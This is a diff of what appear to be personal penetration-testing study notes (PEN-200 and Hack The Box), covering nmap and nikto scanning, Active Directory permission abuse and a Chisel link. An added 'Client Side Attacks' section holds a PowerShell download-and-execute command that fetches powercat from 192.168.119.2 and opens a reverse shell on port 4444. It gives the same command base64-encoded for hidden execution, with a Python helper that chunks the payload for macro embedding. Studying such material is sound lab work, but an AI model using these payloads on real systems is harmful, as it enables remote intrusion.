@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="Nmap Scanning" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1720335839" ts_lastsave="1741607444">
+  <node name="Nmap Scanning" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1720335839" ts_lastsave="1741612463">
     <rich_text>nmap -sS -sV -A -p- -oN nmap.txt IP
 nmap -sS -A -T4 -oN nmap.txt IP
 
@@ -52,6 +52,14 @@ nikto -h </rich_text>
     <rich_text link="webs http://">http://</rich_text>
     <rich_text>
 nmap --script vuln -p &lt;open-ports&gt; &lt;target-ip&gt;
+
+</rich_text>
+  </node>
+  <node name="Chisel" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741612463" ts_lastsave="1741613157">
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://www.youtube.com/watch?v=pbR_BNSOaMk">https://www.youtube.com/watch?v=pbR_BNSOaMk</rich_text>
+    <rich_text>
 
 </rich_text>
   </node>
@@ -123,7 +131,7 @@ net commands
 
  </rich_text>
   </node>
-  <node name="OffSec Live | PEN-200 (2023): AD" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1738465990" ts_lastsave="1738591753">
+  <node name="OffSec Live | PEN-200 (2023): AD" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1738465990" ts_lastsave="1741703764">
     <rich_text>Domain Admin --&gt;highest priv
 Start with low Priv--No local Admin
 whoami
@@ -163,6 +171,21 @@ WriteDACL: Edit ACE's applied to object
 AllExtendedRights: Change password, reset password, etc.
 ForceChangePassword: Password change for object
 Self (Self-Membership): Add ourselves to for example a group
+</rich_text>
+  </node>
+  <node name="Client Side Attacks" unique_id="30" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741703764" ts_lastsave="1741705078">
+    <rich_text>
+Base64 Encode This
+IEX(New-Object System.Net.WebClient).DownloadString('</rich_text>
+    <rich_text link="webs http://192.168.119.2/powercat.ps1');powercat">http://192.168.119.2/powercat.ps1');powercat</rich_text>
+    <rich_text> -c 192.168.119.2 -p 4444 -e powershell
+
+
+str = "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4yIC1wIDQ0NDQgLWUgcG93ZXJzaGVsbA=="
+n = 50
+
+for i in range(0, len(str), n):
+    print("Str = Str + " + '"' + str[i:i+n] + '"')
 </rich_text>
   </node>
   <node name="HTB- Optimum" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1720336151" ts_lastsave="1720844574">
